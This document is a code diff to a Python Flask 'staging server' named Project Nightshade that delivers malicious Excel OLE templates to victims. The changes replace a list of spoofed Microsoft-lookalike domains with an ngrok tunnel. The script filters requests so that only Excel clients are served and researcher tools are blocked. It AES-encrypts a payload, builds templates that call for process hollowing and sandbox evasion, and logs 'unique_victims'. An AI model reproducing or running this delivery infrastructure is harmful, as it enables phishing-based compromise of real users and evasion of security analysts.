@@ -1,13 +1,9 @@
 #!/usr/bin/env python3
 """
-Project Nightshade - Advanced Template Delivery Server
+Project Nightshade - Advanced Template Delivery Server with Ngrok
 Author: ek0ms savi0r | OPSEC Grade: Midnight
 Description:
-    Flask server that serves malicious OLE templates with OPSEC protections:
-    - User-Agent filtering (Excel only)
-    - IP logging and basic analytics
-    - Domain rotation capabilities
-    - Quick takedown response system
+    Flask server with ngrok tunneling for instant infrastructure.
 """
 from flask import Flask, request, send_file, abort, jsonify, make_response
 import logging
@@ -21,23 +17,20 @@ from Crypto.Util.Padding import pad
 import base64
 import os
 import json
+import requests
+import subprocess
+import atexit
 
-# Configuration
 class StagingConfig:
     PORT = 8080
     HOST = '0.0.0.0'
     DATABASE = 'staging_logs.db'
     TEMPLATE_FILE = 'nightshade_template.ole'
-    
-    # Multiple fallback domains (rotate through these)
-    DOMAINS = [
-        'cdn.microsoft-update.com',
-        'assets-windows.net',
-        'secure-download.office365.com',
-        'template-store.azurewebsites.net'
-    ]
-    
-    # Valid Excel User-Agents (we'll only serve to these)
+
+    USE_NGROK = True
+    NGROK_AUTH_TOKEN = ''  # Your ngrok auth token for reserved domains
+    NGROK_REGION = 'us'   # us, eu, au, ap, sa, jp, in
+
     EXCEL_USER_AGENTS = [
         'Microsoft Office Excel 2016',
         'Microsoft Excel 2019',
@@ -45,8 +38,7 @@ class StagingConfig:
         'Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0)',
         'Microsoft Office/15.0 (Windows NT 6.1; Microsoft Excel 15.0)'
     ]
-    
-    # Block these research/scanning UAs
+
     BLOCKED_AGENTS = [
         'curl', 'wget', 'python-requests', 'Go-http-client',
         'nmap', 'burp', 'zap', 'metasploit', 'sqlmap'
@@ -56,6 +48,68 @@ class StagingConfig:
 
 app = Flask(__name__)
 config = StagingConfig()
+ngrok_url = None
+ngrok_process = None
+
+def init_ngrok():
+    """Initialize ngrok tunnel"""
+    global ngrok_url, ngrok_process
+    
+    if not config.USE_NGROK:
+        return None
+    
+    try:
+        subprocess.run(['pkill', 'ngrok'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        cmd = [
+            'ngrok', 'http', str(config.PORT),
+            '--region', config.NGROK_REGION,
+            '--log', 'stdout'
+        ]
+        
+        if config.NGROK_AUTH_TOKEN:
+            cmd.extend(['--authtoken', config.NGROK_AUTH_TOKEN])
+
+        ngrok_process = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            universal_newlines=True
+        )
+
+        time.sleep(3)
+        ngrok_url = get_ngrok_url()
+        
+        if ngrok_url:
+            print(f"[+] Ngrok tunnel established: {ngrok_url}")
+            return ngrok_url
+        else:
+            print("[-] Failed to establish ngrok tunnel")
+            return None
+            
+    except Exception as e:
+        print(f"[-] Ngrok error: {e}")
+        return None
+
+def get_ngrok_url():
+    """Get the public ngrok URL"""
+    try:
+        response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
+        tunnels = response.json()['tunnels']
+        for tunnel in tunnels:
+            if tunnel['proto'] == 'https':
+                return tunnel['public_url']
+        return None
+    except:
+        return None
+
+def cleanup_ngrok():
+    """Cleanup ngrok process on exit"""
+    global ngrok_process
+    if ngrok_process:
+        ngrok_process.terminate()
+        ngrok_process.wait()
+    subprocess.run(['pkill', 'ngrok'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def init_database():
     """Initialize SQLite database for logging"""
@@ -96,42 +150,36 @@ def is_excel_request(user_agent):
         return False
     
     user_agent = user_agent.lower()
-    
-    # Check for blocked agents first
+
     for blocked in config.BLOCKED_AGENTS:
         if blocked.lower() in user_agent:
             return False
-    
-    # Check for valid Excel agents
+
     for excel_agent in config.EXCEL_USER_AGENTS:
         if excel_agent.lower() in user_agent:
             return True
     
     return False
 
-def get_current_domain():
-    """Rotate through available domains for OPSEC"""
-    current_time = int(time.time())
-    domain_index = current_time % len(config.DOMAINS)
-    return config.DOMAINS[domain_index]
-
 def generate_malicious_template(payload_content=None):
     """Generate or refresh the malicious OLE template"""
     if not payload_content:
         # Default payload - could be encrypted PowerShell stager
         payload_content = "<?xml version='1.0'?><payload>EXECUTE_PAYLOAD</payload>"
-    
-    # Encrypt payload for additional obfuscation
+
     cipher = AES.new(pad(config.ENCRYPTION_KEY.encode(), AES.block_size), AES.MODE_CBC)
     ct_bytes = cipher.encrypt(pad(payload_content.encode(), AES.block_size))
     encrypted_payload = base64.b64encode(cipher.iv + ct_bytes).decode()
+    
+    # Use ngrok URL if available, otherwise localhost for testing
+    template_url = ngrok_url if ngrok_url else f"http://127.0.0.1:{config.PORT}"
     
     template_content = f'''<?xml version="1.0" encoding="UTF-8"?>
 <Objects xmlns="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
     <Object ProgID="Excel.Macro.1" Version="1.0">
         <Payload>{encrypted_payload}</Payload>
         <ActivationCondition>TRUE</ActivationCondition>
-        <RemoteTemplate>https://{get_current_domain()}/template.ole</RemoteTemplate>
+        <RemoteTemplate>{template_url}/template.ole</RemoteTemplate>
         <ExecutionMethod>ProcessHollowing</ExecutionMethod>
         <OPSEC>
             <SleepOnSandbox>30000</SleepOnSandbox>
@@ -151,20 +199,17 @@ def serve_template():
     """Main endpoint for template delivery"""
     client_ip = request.remote_addr
     user_agent = request.headers.get('User-Agent', '')
-    
-    # OPSEC: Only serve to genuine Excel clients
+
     if not is_excel_request(user_agent):
         log_block(client_ip, "INVALID_USER_AGENT", user_agent)
         abort(404)  # Return 404 to avoid suspicion
-    
-    # Additional checks: Rate limiting, geographic filtering, etc.
+
     if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
         log_block(client_ip, "AJAX_REQUEST", user_agent)
         abort(404)
-    
-    # Serve the malicious template
-    current_domain = get_current_domain()
-    log_request(client_ip, user_agent, current_domain)
+
+    domain_used = ngrok_url if ngrok_url else request.host
+    log_request(client_ip, user_agent, domain_used)
     
     try:
         return send_file(config.TEMPLATE_FILE, 
@@ -180,11 +225,10 @@ def serve_template():
 
 @app.route('/admin/stats')
 def admin_stats():
-    """Admin endpoint to view statistics (password protected in real use)"""
+    """Admin endpoint to view statistics"""
     conn = sqlite3.connect(config.DATABASE)
     c = conn.cursor()
     
-    # Get delivery statistics
     c.execute("SELECT COUNT(*) FROM requests")
     total_deliveries = c.fetchone()[0]
     
@@ -194,7 +238,6 @@ def admin_stats():
     c.execute("SELECT COUNT(*) FROM blocks")
     total_blocks = c.fetchone()[0]
     
-    # Recent activity
     c.execute("SELECT timestamp, ip, user_agent FROM requests ORDER BY id DESC LIMIT 10")
     recent_activity = c.fetchall()
     
@@ -205,7 +248,7 @@ def admin_stats():
         'unique_victims': unique_victims,
         'total_blocks': total_blocks,
         'recent_activity': recent_activity,
-        'current_domain': get_current_domain(),
+        'ngrok_url': ngrok_url,
         'server_time': datetime.datetime.now().isoformat()
     }
     
@@ -222,35 +265,44 @@ def update_payload():
 
 @app.errorhandler(404)
 def not_found(error):
-    """Custom 404 handler to avoid information leakage"""
+    """Custom 404 handler"""
     return make_response(jsonify({'error': 'Not found'}), 404)
 
-def background_domain_rotation():
-    """Background thread to periodically rotate domains"""
+def background_monitoring():
+    """Background thread to monitor ngrok connection"""
     while True:
-        time.sleep(3600)  # Rotate every hour
-        print(f"[+] Rotating to new domain: {get_current_domain()}")
+        time.sleep(30)
+        if config.USE_NGROK and not get_ngrok_url():
+            print("[!] Ngrok tunnel lost, attempting to reconnect...")
+            init_ngrok()
 
 if __name__ == '__main__':
-    # Initialize database and generate initial template
+    atexit.register(cleanup_ngrok)
+
     init_database()
     generate_malicious_template()
-    
-    # Start domain rotation in background
-    rotation_thread = threading.Thread(target=background_domain_rotation, daemon=True)
-    rotation_thread.start()
+
+    if config.USE_NGROK:
+        ngrok_url = init_ngrok()
+
+    monitor_thread = threading.Thread(target=background_monitoring, daemon=True)
+    monitor_thread.start()
     
     print('''
     ╔══════════════════════════════════════════════════════════╗
     ║               NIGHTSHADE STAGING SERVER                  ║
-    ║                 Template Delivery System                 ║
+    ║                 Ngrok-Enabled Delivery                   ║
     ║                   by : ek0ms savi0r                      ║
     ╚══════════════════════════════════════════════════════════╝
     ''')
     
     print(f"[+] Server starting on {config.HOST}:{config.PORT}")
-    print(f"[+] Current active domain: {get_current_domain()}")
+    if ngrok_url:
+        print(f"[+] Ngrok tunnel active: {ngrok_url}")
+        print(f"[+] Template URL: {ngrok_url}/template.ole")
+    else:
+        print(f"[+] Local template URL: http://127.0.0.1:{config.PORT}/template.ole")
     print("[+] Template filtering enabled - only serving to Excel User-Agents")
     print("[+] Database logging initialized")
     
-    app.run(host=config.HOST, port=config.PORT, debug=False)
+    app.run(host=config.HOST, port=config.PORT, debug=False, use_reloader=False)
